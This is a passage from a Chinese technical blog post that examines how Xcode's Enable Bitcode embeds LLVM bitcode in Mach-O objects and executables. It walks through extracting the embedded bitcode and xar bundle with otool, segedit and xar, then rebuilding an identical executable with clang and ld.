<h2>0x03 Enable Bitcode</h2>

<p>在对bitcode有了一个直观的认识之后，再来看一下Apple围绕bitcode做了什么。Xcode中对Enable Bitcode这个配置的解释是:</p>

<blockquote><p>以下摘自Xcode Help</p>

<p> <a href="https://help.apple.com/xcode/mac/10.1/index.html?localePath=en.lproj#/itcaec37c2a6">https://help.apple.com/xcode/mac/10.1/index.html?localePath=en.lproj#/itcaec37c2a6</a></p>

<h4>Enable Bitcode (ENABLE_BITCODE)</h4>

<p>Activating this setting indicates that the target or project should generate bitcode during compilation for platforms and architectures that support it. For Archive builds, bitcode will be generated in the linked binary for submission to the App Store. For other builds, the compiler and linker will check whether the code complies with the requirements for bitcode generation, but will not generate actual bitcode.</p></blockquote>

<p>具体展开一下：</p>

<ul>
<li>开启此设置将会在支持的平台和架构中开启bitcode

<ul>
<li>当前支持的平台主要是iPhoneOS(armv7/arm64)，watchOS等</li>
<li>注意不包括iPhoneSimulator(i386/x86_64)和macos，也就是说模拟器架构下不会编出bitcode。这个限制只是Xcode自身的限制，并非编译器的限制，我们使用编译器提供的命令行工具自行操作仍然可以编译出这些架构下的bitcode，本文中的示例就是基于macos平台/x86_64架构。</li>
</ul>
</li>
<li>进行Archive时，bitcode会被嵌入到链接后的二进制文件中，用于提交给App Store

<ul>
<li>Enable Bitcode 设置为 YES 时，从编译日志中可以看出，Archive时多了一个编译参数 <code>-fembed-bitcode</code></li>
</ul>
</li>
<li>进行其他类型的Build(非Archive)时，编译器只会检查是否满足开启bitcode的条件，但并不会真正生成bitcode

<ul>
<li>非Archive编译时，Enable Bitcode 将会增加编译参数 <code>-fembed-bitcode-marker</code>， 只是在object文件中做了标记，表明<code>我可以有bitcode，但是现在暂时没有带上它</code>。因为本地编译调试时并不需要bitcode，只有AppStore需要这玩意儿，去掉这个不必要的步骤，会加快编译速度。</li>
<li>这就是为什么有的同学在开发SDK时，明明开启了Enable Bitcode，交给客户后客户却说：你的sdk里没有bitcode，因为你没有使用Archive方式打包。</li>
<li>当然，你可以将 Enable Bitcode 设置为NO， 然后在Other Compiler Flags 和 Other Linker Flags 中手动为真机架构添加<code>-fembed-bitcode</code> 参数，这样任何类型的Build都会带上bitcode</li>
</ul>
</li>
</ul>


<p>接下来看一下 Enable Bitcode 之后，编译出的文件发生了什么变化， 直接在clang的参数中添加 <code>-fembed-bitcode</code> 即可</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -fembed-bitcode -c test.c -o test_bitcode.o
</span></code></pre></td></tr></table></div></figure>


<p>编译之后可以通过tool工具查看object文件的结构，此时你需要对Mach-O文件有一些基本的了解</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>otool -l test_bitcode.o
</span><span class='line'><span class="c"># 以下为otool输出节选</span>
</span><span class='line'>Section
</span><span class='line'>  sectname __bitcode
</span><span class='line'>   segname __LLVM
</span><span class='line'>      addr 0x0000000000000040
</span><span class='line'>      size 0x0000000000000b10
</span><span class='line'>    offset 776
</span><span class='line'>     align 2^4 <span class="o">(</span>16<span class="o">)</span>
</span><span class='line'>    reloff 0
</span><span class='line'>    nreloc 0
</span><span class='line'>     flags 0x00000000
</span><span class='line'> reserved1 0
</span><span class='line'> reserved2 0
</span><span class='line'>Section
</span><span class='line'>  sectname __cmdline
</span><span class='line'>   segname __LLVM
</span><span class='line'>      addr 0x0000000000000b50
</span><span class='line'>      size 0x0000000000000042
</span><span class='line'>    offset 3608
</span><span class='line'>     align 2^4 <span class="o">(</span>16<span class="o">)</span>
</span><span class='line'>    reloff 0
</span><span class='line'>    nreloc 0
</span><span class='line'>     flags 0x00000000
</span><span class='line'> reserved1 0
</span><span class='line'> reserved2 0
</span></code></pre></td></tr></table></div></figure>


<p>或者使用MachOView</p>

<p><img src="http://xelz.info/assets/2018/machoview.png" alt="" /></p>

<p>可以发现生成的 object 文件中多了两个 Section，分别是 <code>__LLVM,__bitcode</code> 和 <code>__LLVM,__cmdline</code>，并且otool的输出中给出了这两个section在object文件中的偏移和大小，通过 <code>dd</code> 命令可以很方便地将这两个Section提取出来</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>776 <span class="nv">count</span><span class="o">=</span>0x0000000000000b10 <span class="k">if</span><span class="o">=</span>test_bitcode.o <span class="nv">of</span><span class="o">=</span>test_bitcode.o.bc
</span><span class='line'>2832+0 records in
</span><span class='line'>2832+0 records out
</span><span class='line'>2832 bytes transferred in 0.017339 secs <span class="o">(</span>163331 bytes/sec<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>dd <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>3608 <span class="nv">count</span><span class="o">=</span>0x0000000000000042 <span class="k">if</span><span class="o">=</span>test_bitcode.o <span class="nv">of</span><span class="o">=</span>test_bitcode.o.cmdline
</span><span class='line'>66+0 records in
</span><span class='line'>66+0 records out
</span><span class='line'>66 bytes transferred in 0.001312 secs <span class="o">(</span>50304 bytes/sec<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>还有一种更便捷的方式，Xcode 提供的 <code>segedit</code> 命令可以直接将指定的Section导出，只需要给定Section的名字，和上面的命令效果是一样的，并且更为方便</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>segedit -extract __LLVM __bitcode test_bitcode.o.bc <span class="se">\</span>
</span><span class='line'>          -extract __LLVM __cmdline test_bitcode.o.cmdline <span class="se">\</span>
</span><span class='line'>          test_bitcode.o
</span></code></pre></td></tr></table></div></figure>


<p>观察一下导出的文件</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>file test_bitcode.o.bc
</span><span class='line'>test_bitcode.o.bc: LLVM bitcode, wrapper x86_64
</span><span class='line'><span class="nv">$ </span>cat test_bitcode.o.cmdline <span class="p">|</span> tr <span class="s1">&#39;\0&#39;</span> <span class="s1">&#39; &#39;</span>
</span><span class='line'>-triple x86_64-apple-macosx10.14.0 -emit-obj -disable-llvm-passes
</span><span class='line'><span class="nv">$ </span>md5 test.bc test_bitcode.o.bc
</span><span class='line'>MD5 <span class="o">(</span>test.bc<span class="o">)</span> <span class="o">=</span> 1592ed7db86742184a559e86cb9d1355
</span><span class='line'>MD5 <span class="o">(</span>test_bitcode.o.bc<span class="o">)</span> <span class="o">=</span> 9901ac8db63be30dafc19c2f06b0cae8
</span></code></pre></td></tr></table></div></figure>


<p>不难得出结论：</p>

<ul>
<li>object文件中嵌入的<code>__LLVM,__bitcode</code> 正是完整的，未经任何加密或者压缩的bitcode文件，通过 <code>-fembed-bitcode</code> 参数，clang把对应的bitcode文件整个嵌入到了object文件中</li>
<li><code>__LLVM,__cmdline</code> 是编译这个文件所用到的参数，如果要通过导出的bitcode重新编译这个object文件，必须带上这些参数

<ul>
<li>导出的参数是<code>cc1</code> 也就是clang中真正&#8221;前端&#8221;部分的参数(clang命令其实是整合了各个环节，所以clang一个命令可以从源代码编出可执行文件)，所以编译时要带上<code>-cc1</code></li>
</ul>
</li>
<li>导出的bitcode文件似乎和直接编译的bitcode不一样，先留个疑问，后面再研究</li>
</ul>


<p>首先， 来测试一下导出的bitcode文件结合cmdline能否编译出正常的object:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -cc1 -triple x86_64-apple-macosx10.14.0 -emit-obj -disable-llvm-passes test_bitcode.o.bc -o test_rebuild.o
</span><span class='line'><span class="nv">$ </span>file test_rebuild.o
</span><span class='line'>test_rebuild.o: Mach-O 64-bit object x86_64
</span><span class='line'><span class="nv">$ </span>md5 test.o test_rebuild.o
</span><span class='line'>MD5 <span class="o">(</span>test.o<span class="o">)</span> <span class="o">=</span> 70ea3a520c26df84d1f7ca552e8e6620
</span><span class='line'>MD5 <span class="o">(</span>test_rebuild.o<span class="o">)</span> <span class="o">=</span> 70ea3a520c26df84d1f7ca552e8e6620
</span></code></pre></td></tr></table></div></figure>


<p>没有任何问题，并且通过内嵌的bitcode编译出的object文件与直接从源代码编译出来的object完全一样！鹅妹子嘤~！</p>

<p>回到遗留的问题：为什么导出的bitcode文件和直接编译的bitcode会不一样？明明编出的object都是一模一样的！这是因为二进制的bitcode文件中还保存了一些与实际代码无关的meta信息。如果能将bitcode转换为文本格式，将能更直观地进行对比。前面已经提到，xcode中并没有附带转换工具，但是我们依然可以通过clang来完成这一操作，还记得前面用过的 <code>-emit-llvm -S</code> 吗？</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -emit-llvm -S test_bitcode.o.bc -o test_bitcode.o.ll
</span></code></pre></td></tr></table></div></figure>


<p>神奇吧？输入虽然已经是bitcode了，并非源代码，但是clang也能&#8221;编译&#8221;出LLVM Assembly。其实clang内部是先将输入的文件转换成Module对象，然后再执行对应的处理：</p>

<ul>
<li>如果输入是源代码，会先进行前端编译，得到一个Module</li>
<li>如果输入是bitcode或者LLVM Assembly，那么直接进行parse操作，即可得到Module对象</li>
<li>如果输出类型是LLVM Assembly，将Module对象序列化为文本格式</li>
<li>如果输出类型是bitcode，则将Module对象序列化为二进制格式</li>
</ul>


<p>所以完全可以通过clang进行bitcode和LLVM Assembly的相互转换。</p>

<p>现在，可以对比一下前后两次生成的<code>.ll</code>文件:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>diff test_bitcode.o.ll test.ll
</span><span class='line'>1c1
</span><span class='line'>&lt; <span class="p">;</span> <span class="nv">ModuleID</span> <span class="o">=</span> <span class="s1">&#39;test_bitcode.o.bc&#39;</span>
</span><span class='line'>---
</span><span class='line'>&gt; <span class="p">;</span> <span class="nv">ModuleID</span> <span class="o">=</span> <span class="s1">&#39;test.c&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>除了ModuleID，也就是来源的文件名以外，其余部分完全相同，这也就解决了前面的疑虑。</p>

<p>再来回顾一下，前文提到非Archive类型的build，比如直接<code>⌘ + B</code>，即使开启了bitcode，也不会编出bitcode，那么会产生什么样的文件呢？通过观察编译日志可以看出xcode在此时使用了<code>-fembed-bitcode-marker</code> 这样一个参数，我们来试一下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang -fembed-bitcode-marker -c test.c -o test_bitcode_marker.o
</span><span class='line'><span class="nv">$ </span>otool -l test_bitcode_marker.o
</span><span class='line'><span class="c"># 以下为otool输出节选</span>
</span><span class='line'>Section
</span><span class='line'>  sectname __bitcode
</span><span class='line'>   segname __LLVM
</span><span class='line'>      addr 0x0000000000000039
</span><span class='line'>      size 0x0000000000000001    <span class="c"># 只有一个字节</span>
</span><span class='line'>    offset 769
</span><span class='line'>     align 2^0 <span class="o">(</span>1<span class="o">)</span>
</span><span class='line'>    reloff 0
</span><span class='line'>    nreloc 0
</span><span class='line'>     flags 0x00000000
</span><span class='line'><span class="nv">$ </span>objdump -s -section<span class="o">=</span>__bitcode test_bitcode_marker.o
</span><span class='line'>Contents of section __bitcode:
</span><span class='line'> 0039 00                                   . <span class="c"># 只有一个字节 0x00</span>
</span></code></pre></td></tr></table></div></figure>


<p>这样的方式编译出的文件结构与<code>-fembed-bitcode</code> 的结果是一样的，唯一的区别就是 <code>__LLVM,__bitcode</code> 和 <code>__LLVM,__cmdline</code> 的内容并没有将实际的bitcode文件和编译参数嵌入进来，取而代之的一个字节的占位符 <code>0x00</code></p>

<h2>0x04 Bitcode Bundle</h2>

<p>已经搞清楚了bitcode是如何嵌入在object文件里的，但是object只是编译过程的中间产物，真正运行的代码是多个object文件经过链接之后的可执行文件，接下来要分析下object中嵌入的bitcode是如何被链接的：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>clang test.o -o <span class="nb">test</span> <span class="c"># 链接原始object</span>
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>hello, world.
</span><span class='line'><span class="nv">$ </span>clang -fembed-bitcode test_bitcode.o -o test_bitcode <span class="c"># 链接带bitcode的object</span>
</span><span class='line'><span class="nv">$ </span>./test_bitcode
</span><span class='line'>hello, world.
</span><span class='line'><span class="nv">$ </span>otool -l test_bitcode
</span><span class='line'><span class="c"># 以下为otool输出节选</span>
</span><span class='line'>Section
</span><span class='line'>  sectname __bundle
</span><span class='line'>   segname __LLVM
</span><span class='line'>      addr 0x0000000100002000
</span><span class='line'>      size 0x0000000000001261
</span><span class='line'>    offset 8192
</span><span class='line'>     align 2^0 <span class="o">(</span>1<span class="o">)</span>
</span><span class='line'>    reloff 0
</span><span class='line'>    nreloc 0
</span><span class='line'>     flags 0x00000000
</span><span class='line'> reserved1 0
</span><span class='line'> reserved2 0
</span></code></pre></td></tr></table></div></figure>


<p>object中的 <code>__LLVM,__bitcode</code> 和 <code>__LLVM,__cmdline</code> 不见了，取而代之的是一个 <code>__LLVM,__bundle</code> 的Section， 通过名字可以基本推断出object中的bitcode被打包在了一起，把它从可执行文件中dump出来一探究竟：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>segedit -extract __LLVM __bundle bundle test_bitcode
</span><span class='line'><span class="nv">$ </span>file bundle
</span><span class='line'>bundle: xar archive version 1, SHA-1 checksum
</span></code></pre></td></tr></table></div></figure>


<p>这个bundle文件是一个<code>xar</code>格式的压缩包，xar格式包含了一个<code>xml</code>格式的文件头(TOC)，里面用于存放各种文件的基本属性以及一些附加附加信息，可以通过xar命令查看并解压</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>xar -d toc.xml -f bundle <span class="c"># 导出文件头</span>
</span><span class='line'><span class="nv">$ </span>mkdir bundle.extract
</span><span class='line'><span class="nv">$ </span>xar -x -C bundle.extract -f bundle <span class="c"># 解压文件</span>
</span><span class='line'><span class="nv">$ </span>ls bundle.extract
</span><span class='line'>1
</span><span class='line'><span class="nv">$ </span>file bundle.extract/1
</span><span class='line'>bundle.extract/1: LLVM bitcode, wrapper x86_64
</span><span class='line'><span class="nv">$ </span>md5 bundle.extract/1 test_bitcode.o.bc
</span><span class='line'>MD5 <span class="o">(</span>bundle.extract/1<span class="o">)</span> <span class="o">=</span> 9901ac8db63be30dafc19c2f06b0cae8
</span><span class='line'>MD5 <span class="o">(</span>test_bitcode.o.bc<span class="o">)</span> <span class="o">=</span> 9901ac8db63be30dafc19c2f06b0cae8
</span></code></pre></td></tr></table></div></figure>


<p>查看导出的toc.xml</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="nt">&lt;xar&gt;</span>
</span><span class='line'> <span class="nt">&lt;subdoc</span> <span class="na">subdoc_name=</span><span class="s">&quot;Ld&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
</span><span class='line'>  <span class="nt">&lt;architecture&gt;</span>x86_64<span class="nt">&lt;/architecture&gt;</span>
</span><span class='line'>  <span class="nt">&lt;platform&gt;</span>macOS<span class="nt">&lt;/platform&gt;</span>
</span><span class='line'>  <span class="nt">&lt;sdkversion&gt;</span>10.14.0<span class="nt">&lt;/sdkversion&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dylibs&gt;</span>
</span><span class='line'>   <span class="nt">&lt;lib&gt;</span>{SDKPATH}/usr/lib/libSystem.B.dylib<span class="nt">&lt;/lib&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/dylibs&gt;</span>
</span><span class='line'>  <span class="nt">&lt;link-options&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>-execute<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>-macosx_version_min<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>10.14.0<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>-e<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>_main<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>-executable_path<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>   <span class="nt">&lt;option&gt;</span>test<span class="nt">&lt;/option&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/link-options&gt;</span>
</span><span class='line'> <span class="nt">&lt;/subdoc&gt;</span>
</span><span class='line'> <span class="nt">&lt;toc&gt;</span>
</span><span class='line'>  <span class="nt">&lt;checksum</span> <span class="na">style=</span><span class="s">&quot;sha1&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>   <span class="nt">&lt;size&gt;</span>20<span class="nt">&lt;/size&gt;</span>
</span><span class='line'>   <span class="nt">&lt;offset&gt;</span>0<span class="nt">&lt;/offset&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/checksum&gt;</span>
</span><span class='line'>  <span class="nt">&lt;creation-time&gt;</span>2018-12-19T12:07:24<span class="nt">&lt;/creation-time&gt;</span>
</span><span class='line'>  <span class="nt">&lt;file</span> <span class="na">id=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>   <span class="nt">&lt;name&gt;</span>1<span class="nt">&lt;/name&gt;</span>
</span><span class='line'>   <span class="nt">&lt;type&gt;</span>file<span class="nt">&lt;/type&gt;</span>
</span><span class='line'>   <span class="nt">&lt;data&gt;</span>
</span><span class='line'>    <span class="nt">&lt;archived-checksum</span> <span class="na">style=</span><span class="s">&quot;sha1&quot;</span><span class="nt">&gt;</span>56346f644ab01200e0ad56eaefb9346a863cb473<span class="nt">&lt;/archived-checksum&gt;</span>
</span><span class='line'>    <span class="nt">&lt;extracted-checksum</span> <span class="na">style=</span><span class="s">&quot;sha1&quot;</span><span class="nt">&gt;</span>56346f644ab01200e0ad56eaefb9346a863cb473<span class="nt">&lt;/extracted-checksum&gt;</span>
</span><span class='line'>    <span class="nt">&lt;size&gt;</span>2832<span class="nt">&lt;/size&gt;</span>
</span><span class='line'>    <span class="nt">&lt;offset&gt;</span>20<span class="nt">&lt;/offset&gt;</span>
</span><span class='line'>    <span class="nt">&lt;encoding</span> <span class="na">style=</span><span class="s">&quot;application/octet-stream&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;length&gt;</span>2832<span class="nt">&lt;/length&gt;</span>
</span><span class='line'>   <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>   <span class="nt">&lt;file-type&gt;</span>Bitcode<span class="nt">&lt;/file-type&gt;</span>
</span><span class='line'>   <span class="nt">&lt;clang&gt;</span>
</span><span class='line'>    <span class="nt">&lt;cmd&gt;</span>-triple<span class="nt">&lt;/cmd&gt;</span>
</span><span class='line'>    <span class="nt">&lt;cmd&gt;</span>x86_64-apple-macosx10.14.0<span class="nt">&lt;/cmd&gt;</span>
</span><span class='line'>    <span class="nt">&lt;cmd&gt;</span>-emit-obj<span class="nt">&lt;/cmd&gt;</span>
</span><span class='line'>    <span class="nt">&lt;cmd&gt;</span>-disable-llvm-passes<span class="nt">&lt;/cmd&gt;</span>
</span><span class='line'>   <span class="nt">&lt;/clang&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/file&gt;</span>
</span><span class='line'> <span class="nt">&lt;/toc&gt;</span>
</span><span class='line'><span class="nt">&lt;/xar&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>header的结构非常清晰，内容基本包含这些：</p>

<ul>
<li>ld 的基本参数，我们链接时使用的是clang，实际上clang内部调用了ld，这里记录的是ld的参数

<ul>
<li>version: bitcode bundle 的版本号</li>
<li>architecture: 目标架构</li>
<li>platform: 目标平台</li>
<li>sdkversion: sdk版本</li>
<li>dylibs: 链接的动态库</li>
<li>link-options: 其他链接参数</li>
</ul>
</li>
<li>文件目录

<ul>
<li>checksum类型</li>
<li>创建时间</li>
<li>每个文件的信息

<ul>
<li>文件名，这里并非原始文件名，而是按照链接时输入的顺序被重命名为数字序号</li>
<li>基本属性，包括checksum、偏移、大小等</li>
<li>文件类型，一般是Bitcode，还有两种特殊类型，Object以及Bundle，这里卖个关子，大家有兴趣可已自行研究(想想如果一个源代码文件是.s格式，要如何支持bitcode)</li>
<li>编译器类型(clang/swift)及编译参数，这部分就是object文件中 <code>__LLVM,__cmdline</code> 的内容</li>
</ul>
</li>
<li>下一个文件的信息(如有)</li>
<li>重复</li>
</ul>
</li>
</ul>


<p>从bundle中解压出来的文件，就是object中嵌入的bitcode，通过MD5对比可以看出链接时对bitcode文件自身没有做任何处理。可以注意到，用于编译各个bitcode文件的参数(cmdline)被放进了TOC中文件描述的区域，而TOC中多出了一个部分用于存放链接时所需要的信息和必要的参数，有了这些信息， 我们不难通过bitcode重新编译，并链接出一个新的可执行文件：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># 首先根据文件目录，将解压出的每一个bitcode文件编译为object</span>
</span><span class='line'><span class="nv">$ </span>clang -cc1 -triple x86_64-apple-macosx10.14.0 -emit-obj -disable-llvm-passes bundle.extract/1 -o bundle.extract/1.o -x ir
</span><span class='line'><span class="c"># 由于解压出的文件没有后缀名，clang无法判断输入文件的格式，因此使用 -x ir 强制指定输入文件为ir格式</span>
</span><span class='line'><span class="c"># 也可以将其重命名为1.bc，这样就不用指定-x ir</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 根据toc.xml中提供的链接参数，将所有object文件链接为可执行文件，本例中只有一个文件</span>
</span><span class='line'><span class="nv">$ </span>ld <span class="se">\</span>
</span><span class='line'>    -arch x86_64 <span class="sb">`</span><span class="c"># architecture` \</span>
</span><span class='line'>    -syslibroot <span class="sb">`</span>xcrun --show-sdk-path --sdk macosx<span class="sb">`</span> <span class="sb">`</span><span class="c"># platform` \</span>
</span><span class='line'>    -sdk_version 10.14.0 <span class="sb">`</span><span class="c"># sdkversion` \</span>
</span><span class='line'>    -lSystem <span class="sb">`</span><span class="c"># dylibs` \</span>
</span><span class='line'>    -execute <span class="sb">`</span><span class="c"># link-options` \</span>
</span><span class='line'>    -macosx_version_min 10.14.0 <span class="sb">`</span><span class="c"># link-options` \</span>
</span><span class='line'>    -e _main <span class="sb">`</span><span class="c"># link-options` \</span>
</span><span class='line'>    -executable_path <span class="nb">test</span> <span class="sb">`</span><span class="c"># link-options` \</span>
</span><span class='line'>    -o test_rebuild <span class="sb">`</span><span class="c"># 输出文件` \</span>
</span><span class='line'>    bundle.extract/1.o <span class="sb">`</span><span class="c"># 输入文件`</span>
</span><span class='line'><span class="nv">$ </span>./test_rebuild
</span><span class='line'>hello, world.
</span><span class='line'><span class="nv">$ </span>md5 test_rebuild <span class="nb">test</span>
</span><span class='line'>MD5 <span class="o">(</span>test_rebuild<span class="o">)</span> <span class="o">=</span> f4786288582decf2b8a1accb1aaa4a3c
</span><span class='line'>MD5 <span class="o">(</span><span class="nb">test</span><span class="o">)</span> <span class="o">=</span> f4786288582decf2b8a1accb1aaa4a3c
</span></code></pre></td></tr></table></div></figure>


<p>看！我们成功利用bitcode重新编了一份一模一样的可执行文件出来。</p>

